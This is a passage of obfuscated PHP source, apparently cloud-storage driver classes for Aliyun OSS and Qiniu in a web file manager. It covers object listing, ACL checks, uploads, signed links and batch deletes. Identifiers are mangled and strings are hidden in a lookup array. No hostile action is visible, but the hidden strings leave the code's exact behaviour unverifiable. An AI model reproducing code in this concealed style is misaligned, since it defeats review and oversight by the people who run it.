($¶Ûì‡¬[$Œ®“­ò[77]] as $Ñì÷ÍÒú => $ç‡àŒ¬Û) { $¶Ûì‡¬[$Œ®“­ò[77]][$Ñì÷ÍÒú] = $this->folderInfo($ç‡àŒ¬Û, $øß˜¡Ó¿, $ç‡àŒ¬Û); } foreach ($¶Ûì‡¬[$Œ®“­ò[76]] as $Ñì÷ÍÒú => $ç‡àŒ¬Û) { $¶Ûì‡¬[$Œ®“­ò[76]][$Ñì÷ÍÒú] = $this->fileInfo($ç‡àŒ¬Û[$Œ®“­ò[32]], $øß˜¡Ó¿, $ç‡àŒ¬Û); } return $¶Ûì‡¬; } public function has($ÕÆÈôµò, $‡óÕºÄ× = false, $ôğ‡ø‘¹ = true) { $ÅîËÉõ¦ =& $_SERVER[ê‘³Æ±]; $ÕÆÈôµò = trim($ÕÆÈôµò, $ÅîËÉõ¦[8]); $–¤ô…Ä = empty($ÕÆÈôµò) && $ÕÆÈôµò !== $ÅîËÉõ¦[192] ? $ÅîËÉõ¦[12] : $ÕÆÈôµò . $ÅîËÉõ¦[8]; $ã†¾ê¬º = $ÅîËÉõ¦[12]; $®­°íø¬ = 500; $¨·Ç«†ê = $Œ§„ © = 0; while (!0) { check_abort(); $øƒÍê¼½ = array($ÅîËÉõ¦[1380] => $ÅîËÉõ¦[8], $ÅîËÉõ¦[1381] => $–¤ô…Ä, $ÅîËÉõ¦[1382] => $®­°íø¬, $ÅîËÉõ¦[1383] => $ã†¾ê¬º); try { $èê¹õßŒ = $this->client->listObjects($this->bucket, $øƒÍê¼½); } catch (OSS\Core\OssException $Ô‚¤Ú²×) { break; } $ã†¾ê¬º = $èê¹õßŒ->getNextMarker(); $“ÅÍååï = $èê¹õßŒ->getObjectList(); $¤ÛïÎ•å = $èê¹õßŒ->getPrefixList(); if ($‡óÕºÄ×) { if (count($“ÅÍååï) > 1 || count($“ÅÍååï) == 1 && $“ÅÍååï[0]->getKey() != $–¤ô…Ä) { $¨·Ç«†ê += count($“ÅÍååï) - 1; } if (!empty($¤ÛïÎ•å)) { $Œ§„ © += count($¤ÛïÎ•å); } if ($ã†¾ê¬º === $ÅîËÉõ¦[12]) { break; } continue; } if ($ôğ‡ø‘¹) { if (!empty($“ÅÍååï)) { if (count($“ÅÍååï) > 1 || $“ÅÍååï[0]->getKey() != $–¤ô…Ä) { return !0; } } } else { if (!empty($¤ÛïÎ•å)) { return !0; } } if ($ã†¾ê¬º === $ÅîËÉõ¦[12]) { break; } } if ($‡óÕºÄ×) { return array($ÅîËÉõ¦[204] => $¨·Ç«†ê, $ÅîËÉõ¦[205] => $Œ§„ ©); } return !1; } public function listAll($ú­ñ¼¨œ) { $‰ õ»Ä§ =& $_SERVER[ê‘³Æ±]; $çğõ¢Í” = $this->fileList($ú­ñ¼¨œ, $‰ õ»Ä§[12], !0); $ĞñÇ‰” = array(); foreach ($çğõ¢Í”[$‰ õ»Ä§[76]] as $¹—Ÿİ‹Ã) { $ĞñÇ‰”[$¹—Ÿİ‹Ã[$‰ õ»Ä§[32]]] = $¹—Ÿİ‹Ã[$‰ õ»Ä§[80]]; } foreach ($çğõ¢Í”[$‰ õ»Ä§[77]] as $¹—Ÿİ‹Ã) { if (is_string($¹—Ÿİ‹Ã)) { $ĞñÇ‰”[$¹—Ÿİ‹Ã] = 0; } } return $this->listAllFiles($ú­ñ¼¨œ, array_keys($ĞñÇ‰”), $ĞñÇ‰”); } public function canRead($Ê•¼¸µ–) { $™éï“ĞÍ =& $_SERVER[ê‘³Æ±]; $ÈÏÓå = $this->pathAcl($Ê•¼¸µ–); return $ÈÏÓå == $™éï“ĞÍ[1393] || $ÈÏÓå == $™éï“ĞÍ[546] ? !0 : !1; } public function canWrite($Œ˜Ò–°ë) { $×ª­× = $this->pathAcl($Œ˜Ò–°ë); return $×ª­× == $_SERVER[ê‘³Æ±][546] ? !0 : !1; } public function pathAcl($à®Šˆ‡Ç) { $¦Ñí…ö› =& $_SERVER[ê‘³Æ±]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $òú£Ó­Ì = $this->client->getObjectAcl($this->bucket, $this->pathEncode($à®Šˆ‡Ç)); } catch (OSS\Core\OssException $œïÊàŸÌ) { return !1; } $˜˜ó§Å = $òú£Ó­Ì == $¦Ñí…ö›[37] ? $this->bucketAcl : $òú£Ó­Ì; if ($˜˜ó§Å == $¦Ñí…ö›[1394]) { return $¦Ñí…ö›[1393]; } if ($˜˜ó§Å == $¦Ñí…ö›[1395]) { return $¦Ñí…ö›[546]; } return $˜˜ó§Å; } private function chmodPath($×Ğ¼â›, $í¹´ÊÑ = '') { $™Â¾«õ› =& $_SERVER[ê‘³Æ±]; $êû­ıªË = empty($í¹´ÊÑ) ? $™Â¾«õ›[1395] : $í¹´ÊÑ; $÷„Ô¢íİ = array($™Â¾«õ›[37], $™Â¾«õ›[193], $™Â¾«õ›[1394], $™Â¾«õ›[1395]); if (!in_array($êû­ıªË, $÷„Ô¢íİ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($×Ğ¼â›), $êû­ıªË); } catch (OSS\Core\OssException $´¨Ö·™¼) { return !1; } return !0; } public function getContent($¦´³ÈÓ) { return $this->fileSubstr($¦´³ÈÓ, -1); } public function setContent($ë‚‘ê¤Ø, $ù²ª—Ô‰ = '') { $Ë¯¥â¶ =& $_SERVER[ê‘³Æ±]; try { $úø¹Ù´ = $this->trafficLimit($Ë¯¥â¶[1396]); $—ÌÏæß = $this->client->putObject($this->bucket, $this->pathEncode($ë‚‘ê¤Ø), $ù²ª—Ô‰, $úø¹Ù´); } catch (OSS\Core\OssException $ºŸÒ×) { return !1; } $·ûõ¼í‡ = array($Ë¯¥â¶[1386] => trim($—ÌÏæß[$Ë¯¥â¶[1397]], $Ë¯¥â¶[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ë‚‘ê¤Ø))); $this->updateObjMeta($ë‚‘ê¤Ø, $·ûõ¼í‡); return isset($—ÌÏæß[$Ë¯¥â¶[1398]][$Ë¯¥â¶[1345]]) ? !0 : !1; } private function updateObjMeta($í˜É» , $´øÇŠÅÅ) { $í˜É»  = $this->pathEncode($í˜É» ); try { $«­€ÂÇì = array(OSS\OssClient::OSS_HEADERS => $´øÇŠÅÅ); $this->client->copyObject($this->bucket, $í˜É» , $this->bucket, $í˜É» , $«­€ÂÇì); } catch (OSS\Core\OssException $ı‘æ›ÊÄ) { return !1; } return !0; } public function upload($Åµ³”¿©, $Íóæºœä, $×ú«ı±® = false, $—¦ö¹¸‹ = REPEAT_REPLACE) { $Íïı«ù =& $_SERVER[ê‘³Æ±]; $ÈêÓÔëŸ = trim($Åµ³”¿©, $Íïı«ù[8]); $”õ®¯š = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Íïı«ù[1386] => @md5_file($Íóæºœä)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Åµ³”¿©))); $”õ®¯š = $this->trafficLimit($Íïı«ù[1396], $”õ®¯š); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÈêÓÔëŸ), $Íóæºœä, $”õ®¯š); } catch (OSS\Core\OssException $¾¨”­ç) { return !1; } return $this->getPathOuter($Åµ³”¿©); } public function getHost() { $¾İã¹† =& $_SERVER[ê‘³Æ±]; $Í™ÈİÇ¯ = explode($¾İã¹†[178], parent::getHost()); return $Í™ÈİÇ¯[0] . $¾İã¹†[178] . $this->bucket . $¾İã¹†[10] . $Í™ÈİÇ¯[1]; } public function uploadFormData($Œ¦ß£×Ö, $À½ÙĞ”Ä = 3600) { $§İ«”Ç‚ =& $_SERVER[ê‘³Æ±]; if (!($ ê°‘¢ï = $this->getHost())) { return !1; } $ê¬Á¬«§ = $À½ÙĞ”Ä; $öÃ„Âİİ = date($§İ«”Ç‚[1399], time() + $ê¬Á¬«§); $ˆ’ˆÅ = new DateTime($öÃ„Âİİ); $¹¦Åğ = $ˆ’ˆÅ->format(DateTime::ISO8601); $ôóÅñ±– = strpos($¹¦Åğ, $§İ«”Ç‚[293]); $¹¦Åğ = substr($¹¦Åğ, 0, $ôóÅñ±–) . $§İ«”Ç‚[1400]; $Ì…•îÅ = 1048576000 * 5; $Ùº¹ ¹ = $this->pathFather($Œ¦ß£×Ö); $¬ÀŒğó = array($§İ«”Ç‚[1299] => $¹¦Åğ, $§İ«”Ç‚[1300] => array(array($§İ«”Ç‚[1401], 0, $Ì…•îÅ), array($§İ«”Ç‚[1303], $§İ«”Ç‚[1304], $Ùº¹ ¹))); $É¢™ö†à = base64_encode(json_encode($¬ÀŒğó)); $ó¶‘½÷‡ = base64_encode(hash_hmac($§İ«”Ç‚[229], $É¢™ö†à, $this->secret, !0)); $˜ˆÛå´˜ = array($§İ«”Ç‚[1309] => $É¢™ö†à, $§İ«”Ç‚[1402] => $this->accessKey, $§İ«”Ç‚[1305] => $§İ«”Ç‚[1297], $§İ«”Ç‚[1403] => $ó¶‘½÷‡, $§İ«”Ç‚[176] => $ ê°‘¢ï); $˜ˆÛå´˜ = $this->trafficLimit($§İ«”Ç‚[1396], $˜ˆÛå´˜); return $˜ˆÛå´˜; } public function multiUploadFormData($«æ¡ÄºŠ, $Å³øÓ¡ = 3600) { $ûÖö¹şò =& $_SERVER[ê‘³Æ±]; if (!($êÖœÅŠò = $this->getHost())) { return !1; } $ŞÉ‰ä• = $this->trafficLimit($ûÖö¹şò[1396]); $¬ÒıÓş¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($«æ¡ÄºŠ), $ŞÉ‰ä•); return array($ûÖö¹şò[220] => $¬ÒıÓş¢, $ûÖö¹şò[176] => $êÖœÅŠò . $ûÖö¹şò[8] . $this->pathEncode($«æ¡ÄºŠ), $ûÖö¹şò[221] => gmdate($ûÖö¹şò[1404]), $ûÖö¹şò[95] => $«æ¡ÄºŠ); } public function multiUploadAuthData($åüùÉ÷Ñ, $’Ã•éø = array()) { $ç¿ä‘ˆ¦ =& $_SERVER[ê‘³Æ±]; $‚ˆ›À = isset($’Ã•éø[$ç¿ä‘ˆ¦[221]]) ? $’Ã•éø[$ç¿ä‘ˆ¦[221]] : gmdate($ç¿ä‘ˆ¦[1404]); $¾Û³ŞÑ = isset($’Ã•éø[$ç¿ä‘ˆ¦[169]]) ? $’Ã•éø[$ç¿ä‘ˆ¦[169]] : $ç¿ä‘ˆ¦[12]; $³îø²ëÒ = $åüùÉ÷Ñ; if (isset($’Ã•éø[$ç¿ä‘ˆ¦[95]])) { $³îø²ëÒ = $’Ã•éø[$ç¿ä‘ˆ¦[95]]; unset($’Ã•éø[$ç¿ä‘ˆ¦[95]]); } if (isset($’Ã•éø[$ç¿ä‘ˆ¦[222]])) { $’Ã•éø[$ç¿ä‘ˆ¦[221]] = $‚ˆ›À; return $this->listUploadParts($³îø²ëÒ, $’Ã•éø); } $ë‘°’µš = array($ç¿ä‘ˆ¦[223], $ç¿ä‘ˆ¦[12], $ç¿ä‘ˆ¦[120], $‚ˆ›À, "\170\55\x6f\163\x73\55\144\x61\x74\145\72{$‚ˆ›À}", $ç¿ä‘ˆ¦[8] . $this->bucket . $ç¿ä‘ˆ¦[8] . $³îø²ëÒ . $¾Û³ŞÑ); if (strpos($¾Û³ŞÑ, $ç¿ä‘ˆ¦[224]) === 0) { $ë‘°’µš[0] = $ç¿ä‘ˆ¦[225]; if ($İ©¤êãá = $this->trafficLimit($ç¿ä‘ˆ¦[1396])) { $³îø²ëÒ = $ç¿ä‘ˆ¦[1405]; array_splice($ë‘°’µš, 5, 0, $³îø²ëÒ . $ç¿ä‘ˆ¦[4] . $İ©¤êãá[$³îø²ëÒ]); } } if (isset($’Ã•éø[$ç¿ä‘ˆ¦[226]]) && $’Ã•éø[$ç¿ä‘ˆ¦[226]] == $ç¿ä‘ˆ¦[227]) { $ë‘°’µš[0] = $ç¿ä‘ˆ¦[227]; } if (!empty($’Ã•éø[$ç¿ä‘ˆ¦[1406]])) { $ı³Š·íñ = array_merge(array($ë‘°’µš[4]), $’Ã•éø[$ç¿ä‘ˆ¦[1406]]); sort($ı³Š·íñ); $ë‘°’µš[4] = implode($ç¿ä‘ˆ¦[228], $ı³Š·íñ); } $İ à²ì‡ = implode($ç¿ä‘ˆ¦[228], $ë‘°’µš); $ûÊÙÊÃ = base64_encode(hash_hmac($ç¿ä‘ˆ¦[229], $İ à²ì‡, $this->secret, !0)); $±ÀÇ¸Üæ = $ç¿ä‘ˆ¦[1370] . $this->accessKey . $ç¿ä‘ˆ¦[4] . $ûÊÙÊÃ; if (strpos($¾Û³ŞÑ, $ç¿ä‘ˆ¦[224]) === 0) { $±ÀÇ¸Üæ = array($ç¿ä‘ˆ¦[231] => $±ÀÇ¸Üæ, $ç¿ä‘ˆ¦[221] => $‚ˆ›À); if ($İ©¤êãá) { $±ÀÇ¸Üæ = array_merge($±ÀÇ¸Üæ, $İ©¤êãá); } } return $±ÀÇ¸Üæ; } public function listUploadParts($‚¶ÂåâÑ, $àĞ˜å³Ø) { $±ß—½áÜ =& $_SERVER[ê‘³Æ±]; $ñáíÕ¿á = parse_url_query($àĞ˜å³Ø[$±ß—½áÜ[169]]); $†¸ÜÓÛ¡ = $this->client->listParts($this->bucket, $this->pathEncode($‚¶ÂåâÑ), $ñáíÕ¿á[$±ß—½áÜ[220]]); $²£¬”¢ = $†¸ÜÓÛ¡->getListPart(); $œş¼ä¦ç = array(); foreach ($²£¬”¢ as $‹·ĞÏÂ) { $œş¼ä¦ç[] = array($±ß—½áÜ[1390] => $‹·ĞÏÂ->getPartNumber(), $±ß—½áÜ[1391] => trim($‹·ĞÏÂ->getETag(), $±ß—½áÜ[119])); } unset($àĞ˜å³Ø[$±ß—½áÜ[222]], $àĞ˜å³Ø[$±ß—½áÜ[226]]); $â‘­ë‡ú = $this->multiUploadAuthData($‚¶ÂåâÑ, $àĞ˜å³Ø); if (empty($â‘­ë‡ú)) { return !1; } return array($±ß—½áÜ[231] => $â‘­ë‡ú, $±ß—½áÜ[221] => $àĞ˜å³Ø[$±ß—½áÜ[221]], $±ß—½áÜ[233] => $œş¼ä¦ç); } public function download($ıéçÁ¯ò, $êâÈ°Š) { if ($this->isFolder($ıéçÁ¯ò)) { return !1; } try { $½–¶Ô×Ô = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $êâÈ°Š); $½–¶Ô×Ô = $this->trafficLimit($_SERVER[ê‘³Æ±][110], $½–¶Ô×Ô); $this->client->getObject($this->bucket, $this->pathEncode($ıéçÁ¯ò), $½–¶Ô×Ô); } catch (OSS\Core\OssException $ó±¸§´í) { return !1; } return $êâÈ°Š; } public function fileSubstr($ƒÏĞìˆÀ, $Òæé¢Å = 0, $ä…ÃúÕ® = false) { if ($Òæé¢Å === -1) { $ÕıâçØö = array(); } else { if ($ä…ÃúÕ® === !1) { $·œÂ’µ‡ = $this->size($ƒÏĞìˆÀ); } else { $·œÂ’µ‡ = $Òæé¢Å + $ä…ÃúÕ® - 1; } $ÕıâçØö = array(OSS\OssClient::OSS_RANGE => "{$Òæé¢Å}\x2d{$·œÂ’µ‡}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ƒÏĞìˆÀ), $ÕıâçØö); } catch (OSS\Core\OssException $©¬ç²ÍÄ) { think_exception($©¬ç²ÍÄ->getMessage()); return !1; } } private function trafficLimit($Ë‰ï•ş, $î”ïî–û = array()) { $•ä¹©À‡ =& $_SERVER[ê‘³Æ±]; if ($Ë‰ï•ş == $•ä¹©À‡[1396] && $this->isUploadServer() || $Ë‰ï•ş == $•ä¹©À‡[110] && $this->isFileOutServer()) { return $î”ïî–û; } $•§Ëæ³ = floatval($GLOBALS[$•ä¹©À‡[6]][$•ä¹©À‡[90]][$•ä¹©À‡[108]][$Ë‰ï•ş]) * 1024 * 1024 * 8; if (!$•§Ëæ³) { return $î”ïî–û; } $•§Ëæ³ = $•§Ëæ³ < 819200 ? 819200 : ($•§Ëæ³ > 838860800 ? 838860800 : $•§Ëæ³); $î”ïî–û[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($•§Ëæ³); return $î”ïî–û; } public function link($£ãÒÎ˜ª, $¡‰Ğ¯åû = array()) { $Ë»¥ãÕÎ =& $_SERVER[ê‘³Æ±]; if (!$this->exist($£ãÒÎ˜ª) || $this->isFolder($£ãÒÎ˜ª)) { return !1; } try { $¡‰Ğ¯åû = $this->trafficLimit($Ë»¥ãÕÎ[110], $¡‰Ğ¯åû); $«³ÑÊˆ = $this->client->signUrl($this->bucket, $this->pathEncode($£ãÒÎ˜ª), 3600 * 12, $Ë»¥ãÕÎ[227], $¡‰Ğ¯åû); return $this->getCdnLink($«³ÑÊˆ); } catch (OSS\Core\OssException $­’’ûñŞ) { return !1; } } public function fileOut($àÏ§½‚á, $µ¥Ş¯º– = false, $Çµ’Ûõ‡ = false, $â×ä¹± = '') { $àòáÆÍ® =& $_SERVER[ê‘³Æ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($àÏ§½‚á, $µ¥Ş¯º–, $Çµ’Ûõ‡, $â×ä¹±); } if (!$Çµ’Ûõ‡) { $Çµ’Ûõ‡ = $this->pathThis($àÏ§½‚á); } $Çµ’Ûõ‡ = rawurlencode($Çµ’Ûõ‡); $˜ğ…¸œö = get_file_mime(get_path_ext($Çµ’Ûõ‡)); if ($˜ğ…¸œö == $àòáÆÍ®[214]) { return parent::fileOut($àÏ§½‚á, $µ¥Ş¯º–, $Çµ’Ûõ‡, $â×ä¹±); } $µ¥Ş¯º– = $µ¥Ş¯º– ? $àòáÆÍ®[1407] : $àòáÆÍ®[1408]; $ìâÉ”ğê = array(OSS\OssClient::OSS_SUB_RESOURCE => $àòáÆÍ®[1409] . rawurlencode("{$µ¥Ş¯º–}\x3b\146\x69\x6c\145\x6e\141\x6d\145\75{$Çµ’Ûõ‡}")); $ìâÉ”ğê[OSS\OssClient::OSS_SUB_RESOURCE] .= $àòáÆÍ®[1410] . rawurlencode($˜ğ…¸œö); $«¯şüˆ´ = $this->link($àÏ§½‚á, $ìâÉ”ğê); $this->fileOutLink($«¯şüˆ´); } public function fileOutServer($¾•÷è×, $©Ã©–âÀ = false, $ıú€ï = false, $¡ïñå«Â = '') { parent::fileOut($¾•÷è×, $©Ã©–âÀ, $ıú€ï, $¡ïñå«Â); } public function fileOutImage($¥õƒƒûş, $È‹­¿Ï¨ = 250) { $²Ïü™¢ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ê‘³Æ±][1411] . $È‹­¿Ï¨); $âÀ‚Øûå = $this->link($¥õƒƒûş, $²Ïü™¢); $this->fileOutLink($âÀ‚Øûå); } public function fileOutImageServer($…Î»ó²Û, $ÅÚØÙîö = 250) { parent::fileOutImage($…Î»ó²Û, $ÅÚØÙîö); } public function fileOutLink($®Íƒ£©Ñ) { $ê‰„†Ø =& $_SERVER[ê‘³Æ±]; if (!$this->isCdnHost() && substr($®Íƒ£©Ñ, 0, 7) == $ê‰„†Ø[1312]) { $®Íƒ£©Ñ = $ê‰„†Ø[1313] . substr($®Íƒ£©Ñ, 7); } header($ê‰„†Ø[160] . $®Íƒ£©Ñ); die; } public function hashMd5($â›ôÏÇ‚, $Óó¼ÜÆ¤ = '') { $öÖ®§† =& $_SERVER[ê‘³Æ±]; $÷åÔ‹ÃÒ = $this->_objectMeta($â›ôÏÇ‚); if (!$÷åÔ‹ÃÒ) { return $öÖ®§†[12]; } if (!isset($÷åÔ‹ÃÒ[$öÖ®§†[1386]]) && !empty($Óó¼ÜÆ¤)) { $ç•ˆ³¼ = $this->updateObjMeta($â›ôÏÇ‚, array($öÖ®§†[1386] => $Óó¼ÜÆ¤)); $÷åÔ‹ÃÒ[$öÖ®§†[1386]] = $ç•ˆ³¼ ? $Óó¼ÜÆ¤ : $öÖ®§†[12]; } return isset($÷åÔ‹ÃÒ[$öÖ®§†[1386]]) ? strtolower($÷åÔ‹ÃÒ[$öÖ®§†[1386]]) : $öÖ®§†[12]; } public function size($öúôáã‹) { $àÊäãõœ = $this->objectMeta($öúôáã‹); return $àÊäãõœ ? $àÊäãõœ[$_SERVER[ê‘³Æ±][80]] : 0; } public function info($ºÚ„›§–) { if ($this->isFolder($ºÚ„›§–)) { return $this->folderInfo($ºÚ„›§–); } else { if ($this->isFile($ºÚ„›§–)) { return $this->fileInfo($ºÚ„›§–); } } return !1; } public function exist($±‡ÚÈ¸µ) { return $this->isFile($±‡ÚÈ¸µ) || $this->isFolder($±‡ÚÈ¸µ); } public function isFile($Ö©ï…«²) { return !$this->isFolder($Ö©ï…«²) && $this->objectMeta($Ö©ï…«²); } public function isFolder($ÉÌ´—‡®) { return $this->cacheMethod($_SERVER[ê‘³Æ±][200], $ÉÌ´—‡®); } protected function objectMeta($Şúã¨Ä­) { return $this->cacheMethod($_SERVER[ê‘³Æ±][201], $Şúã¨Ä­); } protected function _objectMeta($¾ûä‘¨ï) { $Èô¨Òè« =& $_SERVER[ê‘³Æ±]; try { $îñº–Ìù = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¾ûä‘¨ï)); } catch (OSS\Core\OssException $ÄÎ‰°Ã¾) { $îñº–Ìù = !1; } if ($îñº–Ìù) { $îñº–Ìù[$Èô¨Òè«[80]] = intval($îñº–Ìù[$Èô¨Òè«[1384]]); } return $îñº–Ìù; } protected function _isFolder($¹äö—‰) { $£©ı¨Éˆ =& $_SERVER[ê‘³Æ±]; if ($¹äö—‰ == $£©ı¨Éˆ[12] || $¹äö—‰ == $£©ı¨Éˆ[8]) { return !0; } $İ†àÛÙ = array($£©ı¨Éˆ[1380] => $£©ı¨Éˆ[8], $£©ı¨Éˆ[1381] => rtrim($¹äö—‰, $£©ı¨Éˆ[8]) . $£©ı¨Éˆ[8], $£©ı¨Éˆ[1382] => 1, $£©ı¨Éˆ[1383] => $£©ı¨Éˆ[12]); $®¯ûèÏ = $this->client->listObjects($this->bucket, $İ†àÛÙ); if ($®¯ûèÏ->getObjectList() || $®¯ûèÏ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($°›³œëü) { parent::__construct(); require_once SDK_DIR . $_SERVER[ê‘³Æ±][1412]; $this->_init($°›³œëü); } public function _init($ÇÙá®) { $’Ú¼Îà¹ =& $_SERVER[ê‘³Æ±]; foreach ($ÇÙá® as $šéïÀú± => $½Áø¶áŞ) { if (isset($this->{$šéïÀú±})) { $this->{$šéïÀú±} = $½Áø¶áŞ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’Ú¼Îà¹[1413] . LNG($’Ú¼Îà¹[1371])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‰Û› ¿­, $Ğ‘œŸ‘ğ = '', $Å²Å°Î = REPEAT_RENAME) { if ($this->setContent($‰Û› ¿­, $Ğ‘œŸ‘ğ)) { return $this->getPathOuter($‰Û› ¿­); } return !1; } public function mkdir($ä•„®ì, $ŸªØÏ¸· = REPEAT_SKIP) { $—ËíŸêè =& $_SERVER[ê‘³Æ±]; $Ò¤¶Ø‚› = trim($ä•„®ì, $—ËíŸêè[8]); if ($this->_isFolder($Ò¤¶Ø‚›)) { return $this->getPathOuter($Ò¤¶Ø‚›); } $ä•„®ì = $Ò¤¶Ø‚› . $—ËíŸêè[8]; $²À×Æ« = get_path_this($Ò¤¶Ø‚›); $Îü•×àÖ = $ä•„®ì . $²À×Æ«; if (!$this->mkfile($Îü•×àÖ)) { return !1; } if (!$this->moveFile($Îü•×àÖ, $ä•„®ì)) { $this->delFile($Îü•×àÖ); return !1; } return $this->getPathOuter($Ò¤¶Ø‚›); } public function copyFile($÷Å®”µŸ, $½Âºáî¾) { $õÆºŞ„½ = $this->bucketManager->copy($this->bucket, $÷Å®”µŸ, $this->bucket, $½Âºáî¾, !0); return $õÆºŞ„½ ? !1 : $this->getPathOuter($½Âºáî¾); } public function moveFile($‡ÓşÙÈ, $ƒÔÜçİ) { $ğË©¥Ìä = $this->bucketManager->move($this->bucket, $‡ÓşÙÈ, $this->bucket, $ƒÔÜçİ, !0); return $ğË©¥Ìä ? !1 : $this->getPathOuter($ƒÔÜçİ); } public function delFile($ëÙ¼šØô) { if (!$this->exist($ëÙ¼šØô)) { return !0; } $ˆ²’ğëã = $this->bucketManager->delete($this->bucket, $ëÙ¼šØô); return $ˆ²’ğëã ? !1 : !0; } public function delFolder($—•»´ºÄ) { $¯š€¼‘“ =& $_SERVER[ê‘³Æ±]; if (!$this->exist($—•»´ºÄ)) { return !0; } $this->listItemCache = !1; $ØÄ£ú³Å = $this->fileList($—•»´ºÄ); $this->listItemCache = !0; $ Å¢˜ëÛ = trim($—•»´ºÄ, $¯š€¼‘“[8]) . $¯š€¼‘“[8]; if (!empty($—•»´ºÄ) && $—•»´ºÄ !== $¯š€¼‘“[192] && !in_array($ Å¢˜ëÛ, $ØÄ£ú³Å[$¯š€¼‘“[77]])) { $ØÄ£ú³Å[$¯š€¼‘“[77]][] = $ Å¢˜ëÛ; } $­Çê—Ş÷ = $this->delByBatch($ØÄ£ú³Å[$¯š€¼‘“[76]]); if (!$­Çê—Ş÷) { return !1; } $­Çê—Ş÷ = $this->delByBatch($ØÄ£ú³Å[$¯š€¼‘“[77]]); if (!$­Çê—Ş÷) { return !1; } return $this->delFile($ Å¢˜ëÛ); } private function delByBatch($±Öü¿Ì) { foreach (array_chunk($±Öü¿Ì, 1000) as $¤Ä“ñù) { $˜çïÁ = $this->bucketManager->buildBatchDelete($this->bucket, $¤Ä“ñù); list($¿ï¿ÂÚá, $«ºşÀ„Œ) = $this->bucketManager->batch($˜çïÁ); if ($«ºşÀ„Œ) { return !1; } } return !0; } public function rename($Í½‹ˆ§®, $áæ µä¥) { return $this->renameObject($Í½‹ˆ§®, $áæ µä¥); } public function fileInfo($“Í±òãÀ, $ËíÅÖ²Î = false, $¢Ü¯é—Î = array()) { $ĞÃé™Û =& $_SERVER[ê‘³Æ±]; $ÑŞÕÚÀ = array($ĞÃé™Û[32] => $this->pathThis($“Í±òãÀ), $ĞÃé™Û[78] => $this->getPathOuter($ĞÃé™Û[8] . $“Í±òãÀ), $ĞÃé™Û[33] => $ĞÃé™Û[194], $ĞÃé™Û[80] => isset($¢Ü¯é—Î[$ĞÃé™Û[1414]]) ? $¢Ü¯é—Î[$ĞÃé™Û[1414]] : 0, $ĞÃé™Û[169] => $this->ext($“Í±òãÀ)); if ($ËíÅÖ²Î) { return $ÑŞÕÚÀ; } $ÑŞÕÚÀ[$ĞÃé™Û[195]] = $ÑŞÕÚÀ[$ĞÃé™Û[86]] = 0; $ÑŞÕÚÀ[$ĞÃé™Û[196]] = $ÑŞÕÚÀ[$ĞÃé™Û[197]] = !0; if (empty($¢Ü¯é—Î)) { $¢Ü¯é—Î = $this->objectMeta($“Í±òãÀ); if (!$¢Ü¯é—Î) { return $ÑŞÕÚÀ; } } if (isset($¢Ü¯é—Î[$ĞÃé™Û[1415]])) { $ÑŞÕÚÀ[$ĞÃé™Û[86]] = substr($¢Ü¯é—Î[$ĞÃé™Û[1415]] . $ĞÃé™Û[12], 0, 10); } if (isset($¢Ü¯é—Î[$ĞÃé™Û[1414]])) { $ÑŞÕÚÀ[$ĞÃé™Û[80]] = $¢Ü¯é—Î[$ĞÃé™Û[1414]]; } return $ÑŞÕÚÀ; } public function folderInfo($ÑÀÓ™üË, $„ä¥šê = false) { $é¼Ã°Œ’ =& $_SERVER[ê‘³Æ±]; $¾©ÎîñŞ = array($é¼Ã°Œ’[32] => $this->pathThis($ÑÀÓ™üË), $é¼Ã°Œ’[78] => $this->getPathOuter($é¼Ã°Œ’[8] . $ÑÀÓ™üË), $é¼Ã°Œ’[33] => $é¼Ã°Œ’[79]); if ($„ä¥šê) { return $¾©ÎîñŞ; } $¾©ÎîñŞ[$é¼Ã°Œ’[195]] = $¾©ÎîñŞ[$é¼Ã°Œ’[86]] = 0; $¾©ÎîñŞ[$é¼Ã°Œ’[196]] = $¾©ÎîñŞ[$é¼Ã°Œ’[197]] = !0; $ÑÀÓ™üË = rtrim($ÑÀÓ™üË, $é¼Ã°Œ’[8]) . $é¼Ã°Œ’[8]; $ÛêÆ³Ø¯ = $this->objectMeta($ÑÀÓ™üË); if (isset($ÛêÆ³Ø¯[$é¼Ã°Œ’[1415]])) { $¾©ÎîñŞ[$é¼Ã°Œ’[86]] = substr($ÛêÆ³Ø¯[$é¼Ã°Œ’[1415]] . $é¼Ã°Œ’[12], 0, 10); } return $¾©ÎîñŞ; } public function listPath($ˆÖÒºŠğ, $‡ıïØÃĞ = false) { $‹üÎæû² =& $_SERVER[ê‘³Æ±]; $©îàä£ = $this->fileList($ˆÖÒºŠğ, $‹üÎæû²[8], !0); foreach ($©îàä£[$‹üÎæû²[77]] as $öŒôÖÔ => $‘èö‰şÍ) { $©îàä£[$‹üÎæû²[77]][$öŒôÖÔ] = $this->folderInfo($‘èö‰şÍ, $‡ıïØÃĞ); } foreach ($©îàä£[$‹üÎæû²[76]] as $öŒôÖÔ => $‘èö‰şÍ) { $©îàä£[$‹üÎæû²[76]][$öŒôÖÔ] = 